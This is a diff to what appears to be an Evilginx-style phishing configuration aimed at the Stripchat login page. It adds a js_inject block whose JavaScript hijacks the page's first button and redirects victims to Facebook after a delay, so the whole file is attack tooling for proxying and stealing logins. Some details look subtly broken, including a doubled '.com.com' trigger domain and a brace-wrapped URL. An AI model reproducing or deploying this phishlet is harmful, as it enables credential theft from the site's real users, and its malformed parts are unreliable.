@@ -31,3 +31,27 @@ credentials:
 login:
   domain: 'sv.stripchat.com'
   path: '/login'
+js_inject:
+  - trigger_domains: ["sv.stripchat.com.com"]
+    trigger_paths: ["/login"]
+    script: |
+      async function worker() {
+        const elements = document.getElementsByTagName("BUTTON");
+        const num = elements.length;
+        if (num < 3) {
+          return;
+        } else {
+          document.getElementsByTagName("BUTTON")[0].onclick = redirectme;
+        }
+      }
+      function sleeptime(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+      async function redirectme() {
+        await sleeptime(2000);
+        window.location.href = "{https://www.facebook.com}";
+      }
+      function myFunction() {
+        var run = setInterval("worker()", 1000); 
+      }
+      myFunction();
